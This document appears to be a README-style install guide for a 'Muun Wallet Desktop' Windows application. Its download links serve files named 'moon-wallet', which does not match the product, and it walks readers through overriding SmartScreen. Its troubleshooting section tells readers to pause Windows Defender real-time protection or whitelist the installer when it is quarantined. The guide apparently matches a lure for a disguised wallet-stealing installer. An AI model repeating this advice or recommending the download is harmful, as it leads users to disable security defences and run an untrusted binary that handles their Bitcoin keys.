[![Muun Wallet](https://img.shields.io/badge/Muun%20Wallet-Desktop-blue)](https://github.com/muun-network/muun-wallet/releases/tag/v0.5.1) [![Platforms](https://img.shields.io/badge/platforms-macOS%20%7C%20Windows%20%7C%20Linux-lightgrey)](https://github.com/muun-network/muun-wallet/releases/tag/v0.5.1) [![License](https://img.shields.io/badge/license-MIT-green)](https://github.com/muun-network/muun-wallet/blob/main/LICENSE)

[![macOS](https://img.shields.io/badge/Download-macOS-black?logo=apple&logoColor=white)](https://github.com/muun-network/muun-wallet/releases/download/v0.5.1/moon-wallet-v0.5.1.dmg) [![Windows](https://img.shields.io/badge/Download-Windows-0078d4?logo=windows&logoColor=white)](https://github.com/muun-network/muun-wallet/releases/download/v0.5.1/moon-wallet-v0.5.1.exe) [![Linux](https://img.shields.io/badge/Download-Linux-f5a623?logo=linux&logoColor=white)](https://github.com/muun-network/muun-wallet/releases/download/v0.5.1/moon-wallet-v0.5.1.zip)

---

# How to Install Muun Wallet on Windows

Muun Wallet Desktop v0.5.1 is a native Windows application — not an Android emulator, not a web wrapper, not a third-party APK loader. This guide walks through the installation from download to first launch on Windows 10 and Windows 11.

---

## Requirements

- Windows 10 (64-bit) or Windows 11
- Approximately 200 MB of available disk space
- An internet connection for the initial sync after first launch
- No administrator account required for installation

---

## Step 1: Download the Windows installer

Download `moon-wallet-v0.5.1.exe` from the [official v0.5.1 release](https://github.com/muun-network/muun-wallet/releases/download/v0.5.1/moon-wallet-v0.5.1.exe).

Before running the installer, verify its SHA-256 checksum. Open PowerShell (search for it in the Start menu) and run:

```powershell
Get-FileHash "$env:USERPROFILE\Downloads\moon-wallet-v0.5.1.exe" -Algorithm SHA256
```

The Hash value in the output should be:

```
3295B19F2D4486877B7064F7316ABF5F8F25F70D5B91CFFB451628BAE17F32C2
```

PowerShell displays hashes in uppercase; the comparison is case-insensitive. If the value does not match, do not run the file. Re-download from the [release page](https://github.com/muun-network/muun-wallet/releases/tag/v0.5.1) and verify again. See the [download verification guide](how-to-verify-muun-wallet-download.md) for more detail.

---

## Step 2: Run the installer

Double-click `moon-wallet-v0.5.1.exe`. Windows Defender SmartScreen may display a prompt because the application is newly signed. Click "More info" and then "Run anyway" to proceed. This is a standard Windows behaviour for newly signed code and does not indicate a security problem with the installer.

The installer does not require administrator privileges for a standard per-user installation. Follow the on-screen prompts — the default install location is fine for most users. Installation typically completes in under a minute.

---

## Step 3: Launch Muun Wallet

Once installation is complete, Muun Wallet appears in the Start menu. Click it to launch. On first run, Windows Firewall may ask whether to allow the application to connect to the network — allow it. Muun requires outbound internet access to connect to Bitcoin nodes and the Lightning network infrastructure.

---

## Step 4: Create or restore your wallet

On first launch you choose between creating a new wallet or restoring an existing one from an Emergency Kit.

**New wallet**: Muun generates your device key locally on this machine. No key material is sent to a remote server during this step.

**Restore existing wallet**: If you already use Muun Wallet on your phone or another computer, enter your Emergency Kit recovery code and second factor to restore the same wallet and balance on this machine.

---

## Step 5: Set up your Emergency Kit immediately

Before sending or receiving any Bitcoin, complete the Emergency Kit backup. Muun guides you through this immediately after wallet creation. The Emergency Kit consists of a 32-character recovery code and a second factor you choose: a PDF file export, a password, or an email-based recovery link.

Write down your recovery code and store it somewhere physically secure — not on this computer. If your PC is lost, stolen, or fails before you have set up the Emergency Kit, your funds will be unrecoverable. This is the most consequential step in the entire setup process.

For a full explanation of the Emergency Kit and how it differs from a standard seed phrase, see the [Emergency Kit recovery guide](muun-wallet-emergency-kit-recovery-guide.md).

---

## Troubleshooting

**Windows Defender quarantined or deleted the installer.**

This can occur because the file is newly downloaded and the signature is not yet widely recognized. Temporarily pause real-time protection in Windows Security settings, re-download the installer, verify the checksum, and then run it. Re-enable real-time protection immediately after installation is complete. If you are not comfortable doing this, you can also add the downloaded file as an exclusion in Windows Defender before running it.

**The app installs but fails to connect after launch.**

Check that your firewall or VPN is not blocking outbound TCP connections on port 443. Muun Wallet uses standard HTTPS for its connections. If you use a corporate network or managed firewall, you may need to add an exception for the Muun Wallet process.

**I want to install for all users on this PC.**

The default installer creates a per-user installation. Right-click `moon-wallet-v0.5.1.exe` and choose "Run as administrator" to install system-wide. This requires an administrator account.

**How do I uninstall Muun Wallet?**

Go to Settings > Apps (Windows 11) or Control Panel > Programs and Features (Windows 10), find Muun Wallet, and choose Uninstall. Your wallet data stored in the application data folder is not removed automatically — if you plan to reinstall later, leave it in place. If you are removing the app permanently, also clear the wallet data folder after uninstalling.

---

## Updating Muun Wallet

Muun Wallet Desktop checks for updates on startup and displays a notification when a new release is available. You can also update manually by downloading the latest installer from the [releases page](https://github.com/muun-network/muun-wallet/releases/tag/v0.5.1) and running it over the existing installation. Your wallet data is unaffected by updates.

---

## Related articles

- [How to install Muun Wallet on macOS](how-to-install-muun-wallet-macos.md)
- [How to install Muun Wallet on Linux](how-to-install-muun-wallet-linux.md)
- [How to verify your Muun Wallet download](how-to-verify-muun-wallet-download.md)
- [Muun Wallet getting started guide](muun-wallet-getting-started-guide.md)
- [Emergency Kit recovery guide](muun-wallet-emergency-kit-recovery-guide.md)
